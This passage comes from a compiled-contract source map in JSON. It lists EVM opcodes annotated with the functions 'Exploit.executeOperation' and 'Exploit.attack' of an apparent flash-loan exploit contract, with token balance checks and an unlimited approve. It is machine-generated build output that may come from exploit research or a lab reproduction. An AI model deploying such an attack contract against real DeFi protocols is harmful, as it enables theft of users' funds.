      "op": "MSTORE",
      "path": "0"
    },
    "2697": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2699": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2701": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2703": {
      "op": "SHL"
    },
    "2704": {
      "op": "SUB"
    },
    "2705": {
      "op": "SWAP1"
    },
    "2706": {
      "op": "SWAP2"
    },
    "2707": {
      "op": "AND"
    },
    "2708": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2710": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2711": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ADD",
      "path": "0"
    },
    "2712": {
      "op": "MSTORE"
    },
    "2713": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4137,
        4187
      ],
      "op": "PUSH11",
      "path": "0",
      "value": "0x273AD42557CCC5C6686CA"
    },
    "2725": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2727": {
      "op": "DUP3"
    },
    "2728": {
      "op": "ADD"
    },
    "2729": {
      "op": "MSTORE"
    },
    "2730": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "2732": {
      "op": "ADD"
    },
    "2733": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2735": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2737": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2738": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2739": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2740": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SUB",
      "path": "0"
    },
    "2741": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2742": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2744": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP8",
      "path": "0"
    },
    "2745": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "GAS",
      "path": "0"
    },
    "2746": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "CALL",
      "path": "0"
    },
    "2747": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2748": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2749": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2750": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xACB"
    },
    "2753": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2754": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2755": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2757": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2758": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2759": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2760": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2762": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2763": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2764": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "POP",
      "path": "0"
    },
    "2765": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "POP",
      "path": "0"
    },
    "2766": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "POP",
      "path": "0"
    },
    "2767": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "POP",
      "path": "0"
    },
    "2768": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2770": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2771": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2772": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2774": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "NOT",
      "path": "0"
    },
    "2775": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2777": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2778": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ADD",
      "path": "0"
    },
    "2779": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "AND",
      "path": "0"
    },
    "2780": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2781": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ADD",
      "path": "0"
    },
    "2782": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2783": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2785": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2786": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "POP",
      "path": "0"
    },
    "2787": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2788": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "ADD",
      "path": "0"
    },
    "2789": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2790": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9B1"
    },
    "2793": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2794": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2795": {
      "fn": "Exploit.executeOperation",
      "offset": [
        4094,
        4188
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14DF"
    },
    "2798": {
      "fn": "Exploit.executeOperation",
      "jump": "i",
      "offset": [
        4094,
        4188
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2799": {
      "fn": "Exploit.attack",
      "offset": [
        4202,
        5422
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2800": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "2802": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2803": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2805": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2806": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "2811": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2813": {
      "op": "SHL"
    },
    "2814": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2815": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2816": {
      "fn": "Exploit.attack",
      "offset": [
        4280,
        4284
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "2817": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2819": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2820": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ADD",
      "path": "0"
    },
    "2821": {
      "op": "MSTORE"
    },
    "2822": {
      "fn": "Exploit.attack",
      "offset": [
        4238,
        4254
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2824": {
      "fn": "Exploit.attack",
      "offset": [
        4238,
        4254
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2825": {
      "fn": "Exploit.attack",
      "offset": [
        4289,
        4297
      ],
      "op": "PUSH10",
      "path": "0",
      "value": "0x32D26D12E980B600000"
    },
    "2836": {
      "fn": "Exploit.attack",
      "offset": [
        4289,
        4297
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2837": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2839": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2841": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2843": {
      "op": "SHL"
    },
    "2844": {
      "op": "SUB"
    },
    "2845": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2846": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2847": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "AND",
      "path": "0"
    },
    "2848": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4261
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2849": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4271
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "2854": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4271
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2855": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2857": {
      "op": "ADD"
    },
    "2858": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2860": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2862": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2863": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2864": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2865": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "SUB",
      "path": "0"
    },
    "2866": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2867": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2869": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP8",
      "path": "0"
    },
    "2870": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "GAS",
      "path": "0"
    },
    "2871": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "CALL",
      "path": "0"
    },
    "2872": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2873": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2874": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2875": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB48"
    },
    "2878": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2879": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2880": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2882": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2883": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2884": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2885": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2887": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2888": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2889": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "POP",
      "path": "0"
    },
    "2890": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "POP",
      "path": "0"
    },
    "2891": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "POP",
      "path": "0"
    },
    "2892": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "POP",
      "path": "0"
    },
    "2893": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2895": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2896": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2897": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2899": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "NOT",
      "path": "0"
    },
    "2900": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2902": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2903": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ADD",
      "path": "0"
    },
    "2904": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "AND",
      "path": "0"
    },
    "2905": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2906": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ADD",
      "path": "0"
    },
    "2907": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2908": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2910": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2911": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "POP",
      "path": "0"
    },
    "2912": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2913": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "ADD",
      "path": "0"
    },
    "2914": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2915": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB6C"
    },
    "2918": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2919": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2920": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C6"
    },
    "2923": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4257,
        4286
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2924": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4286
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2925": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4297
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB76"
    },
    "2928": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4297
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2929": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4297
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2930": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4297
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x13EA"
    },
    "2933": {
      "fn": "Exploit.attack",
      "jump": "i",
      "offset": [
        4257,
        4297
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2934": {
      "fn": "Exploit.attack",
      "offset": [
        4257,
        4297
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2935": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4344
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 14,
      "value": "0x2"
    },
    "2937": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4344
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2938": {
      "fn": "Exploit.attack",
      "offset": [
        4361,
        4367
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x5"
    },
    "2940": {
      "fn": "Exploit.attack",
      "offset": [
        4361,
        4367
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "2941": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2943": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2944": {
      "op": "PUSH4",
      "value": "0x95EA7B3"
    },
    "2949": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "2951": {
      "op": "SHL"
    },
    "2952": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2953": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2954": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2956": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2958": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2960": {
      "op": "SHL"
    },
    "2961": {
      "op": "SUB"
    },
    "2962": {
      "fn": "Exploit.attack",
      "offset": [
        4361,
        4367
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2963": {
      "fn": "Exploit.attack",
      "offset": [
        4361,
        4367
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2964": {
      "fn": "Exploit.attack",
      "offset": [
        4361,
        4367
      ],
      "op": "AND",
      "path": "0"
    },
    "2965": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2967": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2968": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "ADD",
      "path": "0"
    },
    "2969": {
      "op": "MSTORE"
    },
    "2970": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2972": {
      "op": "NOT"
    },
    "2973": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2975": {
      "op": "DUP3"
    },
    "2976": {
      "op": "ADD"
    },
    "2977": {
      "op": "MSTORE"
    },
    "2978": {
      "fn": "Exploit.attack",
      "offset": [
        4238,
        4297
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "2979": {
      "fn": "Exploit.attack",
      "offset": [
        4238,
        4297
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "2980": {
      "op": "POP"
    },
    "2981": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4344
      ],
      "op": "AND",
      "path": "0"
    },
    "2982": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4344
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2983": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4352
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x95EA7B3"
    },
    "2988": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4352
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2989": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "2991": {
      "op": "ADD"
    },
    "2992": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2994": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2996": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2997": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2998": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2999": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "SUB",
      "path": "0"
    },
    "3000": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3001": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3003": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP8",
      "path": "0"
    },
    "3004": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3005": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "3006": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3007": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3008": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3009": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBC9"
    },
    "3012": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3013": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3015": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3016": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3017": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3018": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "POP",
      "path": "0"
    },
    "3019": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "GAS",
      "path": "0"
    },
    "3020": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "CALL",
      "path": "0"
    },
    "3021": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3022": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3023": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "3024": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xBDD"
    },
    "3027": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "3028": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3029": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3031": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "DUP1",
      "path": "0"
    },
    "3032": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "3033": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "3034": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "3036": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "REVERT",
      "path": "0"
    },
    "3037": {
      "fn": "Exploit.attack",
      "offset": [
        4340,
        4388
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "3038": {
      "op": "POP"
    },
    "3039": {
      "op": "POP"
    },
    "3040": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4404
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 15,
      "value": "0x5"
    },
    "3042": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4404
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3043": {
      "fn": "Exploit.attack",
      "offset": [
        4424,
        4428
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x2"
    },
    "3045": {
      "fn": "Exploit.attack",
      "offset": [
        4424,
        4428
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3046": {
      "fn": "Exploit.attack",
      "offset": [
        4449,
        4464
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x6"
    },
    "3048": {
      "fn": "Exploit.attack",
      "offset": [
        4449,
        4464
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "3049": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "3051": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "3052": {
      "op": "PUSH4",
      "value": "0x1C4009F9"
    },
    "3057": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "3059": {
      "op": "SHL"
    },
    "3060": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "DUP2",
      "path": "0"
    },
    "3061": {
      "fn": "Exploit.attack",
      "offset": [
        4398,
        4466
      ],
      "op": "MSTORE",
      "path": "0"
    },
